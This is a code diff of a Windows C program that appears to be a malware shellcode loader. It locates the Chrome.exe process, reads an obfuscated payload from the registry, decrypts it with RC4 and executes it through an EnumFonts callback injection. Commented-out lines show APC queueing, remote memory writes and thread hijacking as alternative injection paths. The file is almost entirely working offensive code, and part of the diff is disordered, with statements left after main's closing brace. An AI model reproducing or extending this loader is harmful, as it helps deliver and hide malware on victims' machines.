@@ -2,7 +2,7 @@
 typedef void(WINAPI* pdllMainFunction)();
 int main()
 {
-	HANDLE hProcess = 0, hProcess1 = 0, hProcess2 = 0, hThread = 0, hThread1 = 0;
+	HANDLE hProcess = 0, hProcess1 = 0, hProcess2 = 0, hThread = 0, hThread1 = 0, hTimer = NULL;
 	DWORD  dwPID0 = 0, dwPID1 = 0, dwPID2 = 0, dwOldProtections = 0, dwThreadId;
 	PUCHAR pObfInput = NULL, * pObfOutput = NULL, pKey = NULL, pExtPayloadAddres = NULL;
 	SIZE_T sBytesWritten = 0, sPaddedInputSize = 64, sObfuscatedSize = 0, sClearPayload = 0, sOriginalInputSize = 64;
@@ -11,20 +11,18 @@ int main()
 	PVOID pExPayload, pMain;
 	LPWSTR TargetProcessName = L"Chrome.exe";
 
+	if(!FetchLocalAllertableThread(GetCurrentThreadId(), &dwThreadId, &hThread)) return -2;
+
 	if (!EnumProcessNTQuerySystemInformation(TargetProcessName, &dwPID0, &hProcess)) 
 	{
 		wprintf(L"[!] Enumerate Processes Nt Query System Information Failed to Find %s\n", TargetProcessName);
 		return -1;
 	}
 	wprintf(L"[i] Found %s Process with id %d\n", TargetProcessName, dwPID0);
-	//if(!FetchRemoteThreadHandle(dwPID0, &dwThreadId, &hThread)) wprintf(L"[!] Failed to fetch a remote thread handle and id wis Error Code: %lx\n", GetLastError());
 	
-	if(!FetchLocalAllertableThread(GetCurrentThreadId(), &dwThreadId, &hThread)) return -2;
-	//printf("[i] Found a Thread! Thread Id: %lu\n[!] Starting A Test Run...\n", dwThreadId);
+	//CreateDebuggedProcess("Notepad.exe", &dwPID1, &hProcess1, &hThread1);
 
-	
-
-	if(!ReadRegKeys(&pObfOutput, &sObfuscatedSize)) return -1;
+	if (!ReadRegKeys(&pObfOutput, &sObfuscatedSize)) return -1;
 
 	if (!(pKey = LocalAlloc(LPTR,256))) return -2;
 
@@ -47,28 +45,48 @@ int main()
 
 	if (!rInit(&RC4Context_t, pKey, strlen((CHAR*)pKey))) return -6;
 
-	rFin(&RC4Context_t, resource.pAddress, pPayload_t.pText, resource.sSize);
+	rFin(&RC4Context_t, resource.pAddress, pPayload_t.pText, pPayload_t.sText);
 
-	Sleep(200);
+	//if (!(pExPayload = VirtualAllocEx(hProcess1, 0, pPayload_t.sText,MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))) return -7;
 
-	if (!APCPayloadInjection(hThread, pPayload_t.pText, pPayload_t.sText)) return -6;
+	//if (!WriteProcessMemory(hProcess1, pExPayload, pPayload_t.pText, pPayload_t.sText, &sBytesWritten)) return -10;
+
+	//VirtualProtectEx(hProcess1, pExPayload, pPayload_t.sText,PAGE_EXECUTE, &dwOldProtections);
+
+
+	//QueueUserAPC((PAPCFUNC)pExPayload, hThread1, 0);
+	InjectCallbackPayloadEnumFonts(pPayload_t.pText, (DWORD)pPayload_t.sText, &dwOldProtections, (PVOID*)&pExtPayloadAddres);
+
+	printf("Injecting Shellcode At Address: 0x%p\n", pExtPayloadAddres);
+	getchar();
+
+	//DebugActiveProcessStop(dwPID1);
+
+	//ResumeThread(hThread1);
+
+	//CloseHandle(hThread);
+
+	//CloseHandle(hProcess);
+
+	wprintf(L"[!] Finished!\n");
+
+	char pPath[MAX_PATH] = { '\0' };
+
+	printf("[#] Press 'Enter' To Exit! :)");
+
+	//Sleep(200 * 10);
+
+	return 0;
+}
+	//if (!APCPayloadInjection(hThread1, pExPayload, pPayload_t.sText)) return -6;
 
 	//if (!InjectRemoteProcessShellcode(hProcess, pPayload_t.pText, pPayload_t.sText, &pExPayload))printf("[!] Failed To Inject Shellcode!\n");
 
-	//printf("Injecting Shellcode At Address: 0x%p\n", pExPayload);
 
-	//HijackThread(hThread, pExPayload);
 
-	CloseHandle(hThread);
-	CloseHandle(hProcess);
-	wprintf(L"[!] Finished!\n");
-	char pPath[MAX_PATH] = { '\0' };
+	//printf("[i] Found a Thread! Thread Id: %lu\n[!] Starting A Test Run...\n", dwThreadId);
 
-	//printf("[#] Payload Created Successfully! :)\n");
-	printf("[#] Press 'Enter' To Exit! :)");
-	Sleep(200 * 10);
-	return 0;
-}
+
 	/*
 	if (!FetchLocalThreadHandle(
 		GetCurrentThreadId(),
@@ -77,6 +95,12 @@ int main()
 		)return -4;
 	*/
 	//CreateSacrificialThread(&dwThreadId, &hThread1);
+
+	//printf("[#] Payload Created Successfully! :)\n");
+
+	//HijackThread(hThread, pExPayload);
+
+	//if(!FetchRemoteThreadHandle(dwPID0, &dwThreadId, &hThread)) wprintf(L"[!] Failed to fetch a remote thread handle and id wis Error Code: %lx\n", GetLastError());
 
 	//HijackLocalThread(hThread1, pPayload_t.pText, pPayload_t.sText);
 
